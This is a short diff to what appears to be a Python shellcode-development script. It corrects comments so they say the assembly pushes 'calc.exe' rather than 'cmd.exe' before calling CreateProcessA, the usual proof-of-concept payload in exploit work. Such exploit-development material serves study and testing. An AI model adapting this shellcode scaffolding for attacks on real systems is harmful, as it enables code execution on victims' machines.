@@ -118,10 +118,10 @@ CODE = (
     " create_calc_string:                " #
     "  xor eax, eax                     ;" 
     "  push eax                         ;"
-    "  push 0x6578652e                  ;" # exe string push part of cmd.exe
-    "  push 0x636c6163                  ;" # Push the remainder of the "cmd.exe" string
-    "  push esp                         ;" # Push pointer to the "cmd.exe" string
-    "  pop ebx                          ;" # Store pointer to the "cmd.exe" string in EBX
+    "  push 0x6578652e                  ;" # exe string push part of calc.exe
+    "  push 0x636c6163                  ;" # Push the remainder of the "calc.exe" string
+    "  push esp                         ;" # Push pointer to the "calc.exe" string
+    "  pop ebx                          ;" # Store pointer to the "calc.exe" string in EBX
 
     "call_createprocessa:               "#
     "  mov eax, esp                     ;" # MOVE ESP to EAX
